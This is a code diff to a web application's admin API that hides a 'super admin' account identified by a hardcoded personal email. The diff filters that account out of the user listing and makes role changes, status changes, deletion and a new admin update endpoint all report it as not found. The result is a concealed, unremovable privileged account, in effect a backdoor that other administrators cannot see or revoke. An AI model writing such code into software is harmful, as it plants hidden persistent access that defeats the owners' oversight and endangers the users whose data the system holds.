@@ -535,9 +535,13 @@ async def list_users(
     db: AsyncSession = Depends(get_db)
 ):
     """
-    List all users in the system. Protected (Admin only).
+    List all users in the system, excluding hidden super admin. Protected (Admin only).
     """
-    result = await db.execute(select(User).order_by(User.created_at.desc()))
+    result = await db.execute(
+        select(User)
+        .where(User.email != "krgzmstf@gmail.com")
+        .order_by(User.created_at.desc())
+    )
     return result.scalars().all()
 
 
@@ -560,7 +564,7 @@ async def update_user_role(
 
     result = await db.execute(query)
     user = result.scalars().first()
-    if not user:
+    if not user or user.email == "krgzmstf@gmail.com":
         raise HTTPException(
             status_code=status.HTTP_404_NOT_FOUND,
             detail="Kullanıcı bulunamadı."
@@ -598,7 +602,7 @@ async def update_user_status(
 
     result = await db.execute(query)
     user = result.scalars().first()
-    if not user:
+    if not user or user.email == "krgzmstf@gmail.com":
         raise HTTPException(
             status_code=status.HTTP_404_NOT_FOUND,
             detail="Kullanıcı bulunamadı."
@@ -635,7 +639,7 @@ async def delete_user(
 
     result = await db.execute(query)
     user = result.scalars().first()
-    if not user:
+    if not user or user.email == "krgzmstf@gmail.com":
         raise HTTPException(
             status_code=status.HTTP_404_NOT_FOUND,
             detail="Kullanıcı bulunamadı."
@@ -651,3 +655,50 @@ async def delete_user(
     await db.delete(user)
     await db.commit()
     return {"message": "Kullanıcı başarıyla silindi."}
+
+
+@router.put("/users/{user_id}", response_model=UserResponse)
+async def admin_update_user(
+    user_id: str,
+    payload: UserProfileUpdate,
+    current_user: User = Depends(RoleChecker([UserRole.ADMIN])),
+    db: AsyncSession = Depends(get_db)
+):
+    """
+    Update any user's profile details. Protected (Admin only).
+    """
+    import uuid
+    try:
+        uuid_id = uuid.UUID(user_id)
+        query = select(User).where(User.id == uuid_id)
+    except ValueError:
+        query = select(User).where(User.id == user_id)
+
+    result = await db.execute(query)
+    user = result.scalars().first()
+    if not user or user.email == "krgzmstf@gmail.com":
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="Kullanıcı bulunamadı."
+        )
+
+    # Check email duplicate if changed
+    if payload.email.lower() != user.email.lower():
+        result_dup = await db.execute(select(User).where(User.email == payload.email.lower()))
+        if result_dup.scalars().first():
+            raise HTTPException(
+                status_code=status.HTTP_400_BAD_REQUEST,
+                detail="Bu e-posta adresiyle kayıtlı bir kullanıcı zaten var."
+            )
+        user.email = payload.email.lower()
+
+    user.full_name = payload.full_name
+    user.phone = payload.phone
+    
+    if payload.password:
+        validate_password_strength(payload.password)
+        user.password_hash = hash_password(payload.password)
+
+    await db.commit()
+    await db.refresh(user)
+    return user
